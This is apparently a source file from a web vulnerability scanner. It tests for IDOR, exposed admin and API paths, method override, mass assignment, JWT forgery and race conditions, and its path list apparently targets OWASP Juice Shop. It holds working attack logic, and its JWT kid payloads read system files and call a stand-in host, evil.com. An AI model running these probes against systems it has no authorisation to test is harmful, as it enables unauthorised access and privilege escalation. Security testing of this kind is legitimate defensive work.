# scanner/dast/modules/access.py
# ──────────────────────────────────────────────────────────────────────────────
# ENHANCED ACCESS CONTROL MODULE — IDOR, Privilege Escalation, Auth Bypass,
# JWT Attacks, Mass Assignment, Race Conditions, API Abuse, Admin Panel Discovery
# ──────────────────────────────────────────────────────────────────────────────

import asyncio
import base64
import json
import logging
import re
import time
from typing import Dict, List, Optional, Any, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx

logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_CONFIG = {
    "idor_params": {
        "id", "user_id", "account_id", "order_id", "invoice_id", "doc_id",
        "file_id", "item_id", "message_id", "ticket_id", "report_id",
        "profile_id", "customer_id", "record_id", "pid", "uid", "oid",
        "ref", "uuid", "guid", "key", "token", "basketid", "productid",
        "userid", "quantity", "coupon", "couponcode",
    },
    "admin_paths": [
        "/admin", "/admin/users", "/admin/settings", "/admin/dashboard",
        "/api/admin", "/api/admin/users", "/api/v1/admin", "/api/v2/admin",
        "/management", "/manage", "/superuser", "/root",
        "/api/users", "/api/accounts", "/api/orders", "/api/invoices",
        "/administration", "/score-board",
        "/api/user-management", "/api/complaints",
        "/b2b/v2/orders", "/b2b/v2/supply",
        "/ftp", "/ftp/quarantine",
        "/encryptionkeys", "/encryptionkeys/default",
        "/api/file-server", "/api/error-reporting",
        "/api/data-erasure", "/api/track-result",
        "/api/address-selection", "/api/payment",
        "/api/recycle", "/api/deluxe-membership",
        "/api/quantity", "/api/product-reviews",
        "/api/basket/1/coupon",
    ],
    "jwt_weak_secrets": [
        "secret", "password", "123456", "changeme", "admin", "test",
        "key", "jwt", "token", "qwerty", "letmein", "welcome"
    ],
    "concurrent_requests": 8,
    "test_ids": [-1, 1, 100, 1, 2, 0, 999, 1337, 9999],
    "privileged_fields": {
        "role": "admin", "is_admin": "true", "admin": "1",
        "is_staff": "true", "privilege": "admin", "level": "0",
        "balance": "99999", "credits": "99999", "isAdmin": "true",
        "userRole": "admin", "access_level": "9", "permissions": "all"
    },
    "max_retries": 2,
    "request_timeout": 15,
    "min_response_length": 100,
    "content_diff_threshold": 30
}

# JWT attack payloads
JWT_ALG_NONE_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"   # {"alg":"none","typ":"JWT"}
JWT_HS256_HEADER = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"     # {"alg":"HS256","typ":"JWT"}


class AccessModule:
    def __init__(self, scanner, config: Optional[Dict] = None):
        self.scanner = scanner
        self.config = {**DEFAULT_CONFIG, **(config or {})}
        self.rate_limiter = asyncio.Semaphore(10)  # Prevent overwhelming target

    async def run(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Run all access control tests with enhanced error handling"""
        tasks = []
        
        if params:
            tasks.append(self.test_idor(client, url, params))
        
        tasks.extend([
            self.test_admin_access(client, url),
            self.test_http_method_override(client, url),
            self.test_mass_assignment(client, url, params),
            self.test_jwt_attacks(client, url),
            self.test_race_condition(client, url, params),
            self.test_api_auth_bypass(client, url),
        ])
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Log any exceptions
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Access test failed: {result}")

    # ── Enhanced IDOR Testing ──────────────────────────────────────────────────
    async def test_idor(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Comprehensive IDOR testing with multiple techniques"""
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            
            for param in params:
                if param.lower() not in self.config["idor_params"]:
                    continue
                    
                current_val = qs.get(param, ["1"])[0]
                
                # Test different IDOR techniques based on ID format
                if re.match(r'^\d+$', current_val):  # Numeric IDs
                    await self._test_numeric_idor(client, url, param, current_val, parsed, qs)
                elif re.match(r'^[a-f0-9-]{36}$', current_val, re.IGNORECASE):  # UUIDs
                    await self._test_uuid_idor(client, url, param, current_val, parsed, qs)
                else:  # Other formats
                    await self._test_generic_idor(client, url, param, current_val, parsed, qs)
                    
        except Exception as e:
            logger.error(f"IDOR test failed for {url}: {e}")

    async def _test_numeric_idor(self, client: httpx.AsyncClient, url: str, param: str, 
                               current_val: str, parsed, qs) -> bool:
        """Test numeric IDOR vulnerabilities"""
        try:
            base_id = int(current_val)
            baseline_res = await self._safe_request(client, "GET", url)
            if not baseline_res or baseline_res.status_code != 200:
                return False
                
            baseline_len = len(baseline_res.text)
            
            for test_id in self.config["test_ids"]:
                if test_id < 0 or test_id == base_id:
                    continue
                    
                new_qs = {**qs, param: [str(test_id)]}
                new_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
                res = await self._safe_request(client, "GET", new_url)
                
                if self._is_idor_vulnerable(res, baseline_res, baseline_len, base_id, test_id):
                    self._report_idor(param, new_url, test_id, base_id, res, baseline_res)
                    return True
                    
        except Exception as e:
            logger.debug(f"Numeric IDOR test failed: {e}")
            
        return False

    async def _test_uuid_idor(self, client: httpx.AsyncClient, url: str, param: str,
                            current_val: str, parsed, qs) -> bool:
        """Test UUID-based IDOR vulnerabilities"""
        try:
            baseline_res = await self._safe_request(client, "GET", url)
            if not baseline_res or baseline_res.status_code != 200:
                return False
                
            # Test common UUID variations
            test_uuids = [
                "00000000-0000-0000-0000-000000000000",
                "00000000-0000-0000-0000-000000000001",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                "11111111-1111-1111-1111-111111111111",
            ]
            
            for test_uuid in test_uuids:
                if test_uuid == current_val:
                    continue
                    
                new_qs = {**qs, param: [test_uuid]}
                new_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
                res = await self._safe_request(client, "GET", new_url)
                
                if self._is_idor_vulnerable(res, baseline_res, len(baseline_res.text), current_val, test_uuid):
                    self._report_idor(param, new_url, test_uuid, current_val, res, baseline_res)
                    return True
                    
        except Exception as e:
            logger.debug(f"UUID IDOR test failed: {e}")
            
        return False

    def _is_idor_vulnerable(self, res: Optional[httpx.Response], baseline_res: httpx.Response,
                          baseline_len: int, original_id: Any, test_id: Any) -> bool:
        """Determine if response indicates IDOR vulnerability"""
        if not res or res.status_code != 200:
            return False
            
        # Content length difference
        diff = abs(len(res.text) - baseline_len)
        if (diff > self.config["content_diff_threshold"] and 
            len(res.text) > self.config["min_response_length"]):
            return True
            
        # Different content types
        if (res.headers.get('content-type') != 
            baseline_res.headers.get('content-type')):
            return True
            
        # Different JSON structures
        if self._is_json_response(res) and self._is_json_response(baseline_res):
            try:
                if self._json_structure_diff(res.json(), baseline_res.json()):
                    return True
            except (json.JSONDecodeError, ValueError):
                pass
                
        return False

    def _is_json_response(self, response: httpx.Response) -> bool:
        """Check if response contains JSON"""
        content_type = response.headers.get('content-type', '').lower()
        return 'application/json' in content_type

    def _json_structure_diff(self, json1, json2) -> bool:
        """Compare JSON structures for significant differences"""
        if type(json1) != type(json2):
            return True
            
        if isinstance(json1, dict):
            keys1 = set(json1.keys())
            keys2 = set(json2.keys())
            if keys1 != keys2:
                return True
                
        return False

    def _report_idor(self, param: str, url: str, test_id: Any, original_id: Any,
                   response: httpx.Response, baseline_response: httpx.Response) -> None:
        """Report IDOR finding"""
        self.scanner._add_finding({
            "type": "Insecure Direct Object Reference (IDOR)",
            "subtype": f"Parameter: {param}",
            "url": url,
            "parameter": param,
            "payload": str(test_id),
            "severity": "Critical",
            "confidence": 0.85,
            "evidence": f"ID={test_id} returned 200 vs ID={original_id}",
            "description": (
                f"Parameter '{param}' allows access to other users' objects. "
                f"Object ID {test_id} returned valid content."
            ),
        })

    # ── Enhanced Admin Access Testing ──────────────────────────────────────────
    async def test_admin_access(self, client: httpx.AsyncClient, url: str) -> None:
        """Comprehensive admin path testing"""
        try:
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            
            for path in self.config["admin_paths"]:
                test_url = base + path
                res = await self._safe_request(client, "GET", test_url)
                
                if not res:
                    continue
                    
                if self._is_admin_access_vulnerable(res, test_url):
                    self._report_admin_access(test_url, res)
                    
        except Exception as e:
            logger.error(f"Admin access test failed: {e}")

    def _is_admin_access_vulnerable(self, response: httpx.Response, url: str) -> bool:
        """Determine if admin access is vulnerable"""
        if response.status_code != 200:
            return False
            
        if len(response.text) < self.config["min_response_length"]:
            return False
            
        body_lower = response.text.lower()
        
        # Check if this is a login page (false positive)
        is_login_page = any(k in body_lower for k in [
            "login", "sign in", "username", "password", "email",
            "forgot password", "create account", "register",
        ])
        
        return not is_login_page

    def _report_admin_access(self, url: str, response: httpx.Response) -> None:
        """Report admin access finding"""
        self.scanner._add_finding({
            "type": "Broken Access Control",
            "subtype": "Unauthenticated Admin Endpoint",
            "url": url,
            "parameter": "path",
            "payload": urlparse(url).path,
            "severity": "Critical",
            "confidence": 0.88,
            "evidence": f"HTTP 200 from admin path without authentication",
            "description": (
                f"Admin endpoint is accessible without authentication. "
                f"This allows privilege escalation."
            ),
        })

    # ── Enhanced HTTP Method Override ──────────────────────────────────────────
    async def test_http_method_override(self, client: httpx.AsyncClient, url: str) -> None:
        """Test HTTP method override vulnerabilities"""
        try:
            override_headers = [
                {"X-HTTP-Method-Override": "DELETE"},
                {"X-HTTP-Method-Override": "PUT"},
                {"X-Method-Override": "DELETE"},
                {"X-Method-Override": "PUT"},
                {"X-Override-Method": "PATCH"},
                {"_method": "DELETE"},
                {"_method": "PUT"},
            ]
            
            for headers in override_headers:
                res = await self._safe_request(client, "POST", url, headers=headers, json={})
                
                if res and res.status_code not in (404, 405, 403, 501, 415):
                    self._report_method_override(url, headers, res)
                    return
                    
        except Exception as e:
            logger.error(f"HTTP method override test failed: {e}")

    def _report_method_override(self, url: str, headers: Dict, response: httpx.Response) -> None:
        """Report method override finding"""
        header_name = list(headers.keys())[0]
        header_value = list(headers.values())[0]
        
        self.scanner._add_finding({
            "type": "HTTP Method Override",
            "subtype": f"{header_value} via POST override",
            "url": url,
            "parameter": header_name,
            "payload": header_value,
            "severity": "High",
            "confidence": 0.75,
            "evidence": f"Override header accepted — HTTP {response.status_code}",
            "description": (
                "Server accepts HTTP method override headers, allowing "
                "bypassing of method-based access controls."
            ),
        })

    # ── Enhanced Mass Assignment ───────────────────────────────────────────────
    async def test_mass_assignment(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Test mass assignment vulnerabilities"""
        try:
            if not params:
                return
                
            for field, value in self.config["privileged_fields"].items():
                # Create test data with both existing and privileged fields
                test_data = {p: "test" for p in params[:3]}
                test_data[field] = value
                
                res = await self._safe_request(client, "POST", url, json=test_data)
                
                if res and res.status_code in (200, 201, 204):
                    if self._is_mass_assignment_vulnerable(res, field, value):
                        self._report_mass_assignment(url, field, value, res)
                        return
                        
        except Exception as e:
            logger.error(f"Mass assignment test failed: {e}")

    def _is_mass_assignment_vulnerable(self, response: httpx.Response, field: str, value: str) -> bool:
        """Determine if mass assignment is vulnerable"""
        body_lower = response.text.lower()
        return (field.lower() in body_lower or 
                value.lower() in body_lower or 
                "success" in body_lower)

    def _report_mass_assignment(self, url: str, field: str, value: str, response: httpx.Response) -> None:
        """Report mass assignment finding"""
        self.scanner._add_finding({
            "type": "Mass Assignment",
            "subtype": f"Privileged field: {field}",
            "url": url,
            "parameter": field,
            "payload": f"{field}={value}",
            "severity": "High",
            "confidence": 0.72,
            "evidence": f"Field '{field}={value}' accepted — HTTP {response.status_code}",
            "description": (
                f"POST endpoint accepts '{field}' field without filtering. "
                "Attacker may escalate privileges via mass assignment."
            ),
        })

    # ── Enhanced JWT Attacks ───────────────────────────────────────────────────
    async def test_jwt_attacks(self, client: httpx.AsyncClient, url: str) -> None:
        """Comprehensive JWT vulnerability testing"""
        try:
            jwt_token = self._extract_jwt_token(client)
            if not jwt_token:
                return
                
            # Test multiple JWT attack vectors
            attacks = [
                self._test_jwt_alg_none,
                self._test_jwt_weak_secret,
                self._test_jwt_kid_injection,
                self._test_jwt_payload_tampering,
            ]
            
            for attack in attacks:
                if await attack(client, url, jwt_token):
                    break
                    
        except Exception as e:
            logger.error(f"JWT attack test failed: {e}")

    def _extract_jwt_token(self, client: httpx.AsyncClient) -> Optional[str]:
        """Extract JWT token from client"""
        # Check Authorization header
        auth_header = client.headers.get("Authorization", client.headers.get("authorization", ""))
        if auth_header.startswith("Bearer "):
            return auth_header[7:]
            
        # Check cookies
        for cookie_name, cookie_value in client.cookies.items():
            if (isinstance(cookie_value, str) and 
                cookie_value.count(".") == 2 and 
                len(cookie_value) > 20):
                return cookie_value
                
        return None

    async def _test_jwt_alg_none(self, client: httpx.AsyncClient, url: str, jwt_token: str) -> bool:
        """Test alg:none vulnerability"""
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return False
                
            none_token = f"{JWT_ALG_NONE_HEADER}.{parts[1]}."
            res = await self._safe_request(
                client, "GET", url,
                headers={"Authorization": f"Bearer {none_token}"}
            )
            
            if res and res.status_code == 200:
                self._report_jwt_alg_none(url, none_token, res)
                return True
                
        except Exception as e:
            logger.debug(f"JWT alg:none test failed: {e}")
            
        return False

    async def _test_jwt_weak_secret(self, client: httpx.AsyncClient, url: str, jwt_token: str) -> bool:
        """Test for weak JWT secrets"""
        try:
            # Try to import jwt library
            try:
                import jwt
            except ImportError:
                logger.warning("PyJWT not installed, skipping weak secret test")
                return False
                
            for secret in self.config["jwt_weak_secrets"]:
                try:
                    # Try to decode with weak secret
                    decoded = jwt.decode(
                        jwt_token, 
                        secret, 
                        algorithms=["HS256", "HS384", "HS512"],
                        options={"verify_signature": True}
                    )
                    
                    # If we get here, the secret worked
                    self._report_jwt_weak_secret(url, secret, jwt_token)
                    return True
                    
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
                    
        except Exception as e:
            logger.debug(f"JWT weak secret test failed: {e}")
            
        return False

    async def _test_jwt_kid_injection(self, client: httpx.AsyncClient, url: str, jwt_token: str) -> bool:
        """Test KID header injection"""
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return False
                
            # Decode header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            if "kid" not in header:
                return False
                
            # Test various malicious KID values
            malicious_kids = [
                "../../../../etc/passwd",
                "file:///etc/passwd",
                "http://evil.com/key.pem",
                "/proc/self/environ",
            ]
            
            for malicious_kid in malicious_kids:
                header["kid"] = malicious_kid
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip("=")
                
                malicious_token = f"{new_header}.{parts[1]}.{parts[2]}"
                res = await self._safe_request(
                    client, "GET", url,
                    headers={"Authorization": f"Bearer {malicious_token}"}
                )
                
                if res and res.status_code == 200:
                    self._report_jwt_kid_injection(url, malicious_kid, res)
                    return True
                    
        except Exception as e:
            logger.debug(f"JWT KID injection test failed: {e}")
            
        return False

    async def _test_jwt_payload_tampering(self, client: httpx.AsyncClient, url: str, jwt_token: str) -> bool:
        """Test JWT payload tampering"""
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return False
                
            # Decode and modify payload
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.b64decode(padded))
            
            # Add privileged claims
            payload["role"] = "admin"
            payload["isAdmin"] = True
            payload["admin"] = True
            payload["access_level"] = 999
            
            modified_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")
            
            forged_token = f"{parts[0]}.{modified_payload}.{parts[2]}"
            res = await self._safe_request(
                client, "GET", url,
                headers={"Authorization": f"Bearer {forged_token}"}
            )
            
            if res and res.status_code == 200:
                self._report_jwt_payload_tampering(url, forged_token, res)
                return True
                
        except Exception as e:
            logger.debug(f"JWT payload tampering test failed: {e}")
            
        return False

    def _report_jwt_alg_none(self, url: str, token: str, response: httpx.Response) -> None:
        """Report JWT alg:none finding"""
        self.scanner._add_finding({
            "type": "JWT Algorithm Confusion (alg:none)",
            "subtype": "Signature Not Validated",
            "url": url,
            "parameter": "Authorization",
            "payload": token[:80] + "...",
            "severity": "Critical",
            "confidence": 0.92,
            "evidence": "alg:none token accepted — HTTP 200",
            "description": (
                "Server accepted a JWT with algorithm set to 'none', meaning "
                "the signature was not validated. Any unsigned token is trusted."
            ),
        })

    def _report_jwt_weak_secret(self, url: str, secret: str, token: str) -> None:
        """Report JWT weak secret finding"""
        self.scanner._add_finding({
            "type": "JWT Weak Secret",
            "subtype": f"Secret: '{secret}'",
            "url": url,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": f"JWT signed with weak secret: '{secret}'",
            "description": f"JWT is signed with a weak, guessable secret: '{secret}'"
        })

    def _report_jwt_kid_injection(self, url: str, kid: str, response: httpx.Response) -> None:
        """Report JWT KID injection finding"""
        self.scanner._add_finding({
            "type": "JWT KID Injection",
            "subtype": "Path Traversal in KID",
            "url": url,
            "severity": "High",
            "evidence": f"KID: {kid}",
            "description": "JWT KID header vulnerable to path traversal"
        })

    def _report_jwt_payload_tampering(self, url: str, token: str, response: httpx.Response) -> None:
        """Report JWT payload tampering finding"""
        self.scanner._add_finding({
            "type": "JWT Payload Tampering",
            "subtype": "Role Escalation via Modified Payload",
            "url": url,
            "parameter": "Authorization",
            "payload": "role=admin,isAdmin=true",
            "severity": "Critical",
            "confidence": 0.85,
            "evidence": "Modified JWT payload accepted — role escalation possible",
            "description": "Server accepted a JWT with modified payload without validating the signature.",
        })

    # ── Enhanced Race Condition Testing ────────────────────────────────────────
    async def test_race_condition(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Test for race conditions"""
        try:
            path = urlparse(url).path.lower()
            if not self._is_state_changing_endpoint(path):
                return
                
            success_count = await self._test_concurrent_requests(client, url, params)
            
            if success_count > 1:
                self._report_race_condition(url, success_count)
                
        except Exception as e:
            logger.error(f"Race condition test failed: {e}")

    def _is_state_changing_endpoint(self, path: str) -> bool:
        """Check if endpoint is likely to change state"""
        state_changing_keywords = {
            "transfer", "payment", "purchase", "withdraw", "apply",
            "redeem", "coupon", "vote", "submit", "create", "buy",
            "basket", "order", "checkout", "deluxe", "update", "modify",
            "change", "set", "add", "remove", "delete"
        }
        return any(keyword in path for keyword in state_changing_keywords)

    async def _test_concurrent_requests(self, client: httpx.AsyncClient, url: str, params: List[str]) -> int:
        """Test concurrent requests for race conditions"""
        async def make_request():
            try:
                data = {p: "1" for p in params[:3]} if params else {}
                res = await self._safe_request(client, "POST", url, json=data)
                return res.status_code if res else None
            except Exception:
                return None
                
        tasks = [make_request() for _ in range(self.config["concurrent_requests"])]
        results = await asyncio.gather(*tasks)
        
        return sum(1 for code in results if code in (200, 201, 204))

    def _report_race_condition(self, url: str, success_count: int) -> None:
        """Report race condition finding"""
        self.scanner._add_finding({
            "type": "Race Condition",
            "subtype": "Parallel Request Exploitation",
            "url": url,
            "parameter": "concurrent_requests",
            "payload": f"{self.config['concurrent_requests']} parallel POST requests",
            "severity": "High",
            "confidence": 0.78,
            "evidence": f"{success_count}/{self.config['concurrent_requests']} concurrent requests succeeded",
            "description": (
                f"Endpoint processed {success_count} concurrent requests as successful, "
                "indicating a race condition. This may allow double-spending, coupon reuse, "
                "or bypassing rate limits."
            ),
        })

    # ── Enhanced API Auth Bypass ───────────────────────────────────────────────
    async def test_api_auth_bypass(self, client: httpx.AsyncClient, url: str) -> None:
        """Test API authentication bypass"""
        try:
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            api_paths = [
                "/api/users", "/api/user/1", "/api/admin",
                "/api/basket/1", "/api/orders", "/api/complaints",
                "/api/challenges", "/api/file-server", "/api/settings",
            ]
            
            for path in api_paths:
                test_url = base + path
                res = await self._safe_request(client, "GET", test_url)
                
                if res and res.status_code == 200 and len(res.text) > 100:
                    try:
                        json.loads(res.text)  # Validate JSON
                        self._report_api_auth_bypass(test_url, res)
                    except (json.JSONDecodeError, ValueError):
                        pass
                        
        except Exception as e:
            logger.error(f"API auth bypass test failed: {e}")

    def _report_api_auth_bypass(self, url: str, response: httpx.Response) -> None:
        """Report API auth bypass finding"""
        self.scanner._add_finding({
            "type": "Broken Access Control",
            "subtype": "Unauthenticated API Endpoint",
            "url": url,
            "parameter": "path",
            "payload": urlparse(url).path,
            "severity": "Critical",
            "confidence": 0.90,
            "evidence": f"API returned JSON data without auth ({len(response.text)}B)",
            "description": f"API endpoint returns data without authentication.",
        })

    # ── Utility Methods ────────────────────────────────────────────────────────
    async def _safe_request(self, client: httpx.AsyncClient, method: str, url: str, 
                          **kwargs) -> Optional[httpx.Response]:
        """Make a safe HTTP request with retry and timeout"""
        async with self.rate_limiter:
            try:
                kwargs.setdefault("timeout", self.config["request_timeout"])
                return await self.scanner._req(client, method, url, **kwargs)
            except Exception as e:
                logger.debug(f"Request failed: {method} {url}: {e}")
                return None

    async def _test_generic_idor(self, client: httpx.AsyncClient, url: str, param: str,
                               current_val: str, parsed, qs) -> bool:
        """Test generic IDOR for non-numeric IDs"""
        # Implement generic IDOR testing logic
        return False
